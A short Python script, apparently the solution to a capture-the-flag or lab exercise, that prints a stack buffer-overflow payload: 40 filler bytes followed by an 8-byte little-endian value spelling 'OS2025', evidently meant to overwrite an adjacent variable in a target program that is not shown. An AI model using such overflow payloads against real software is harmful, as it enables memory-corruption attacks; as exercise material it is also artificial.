#!/usr/bin/env python3
import sys

payload = b"A" * 40 + (0x35323032534f).to_bytes(8, "little")

sys.stdout.buffer.write(payload + b"\n")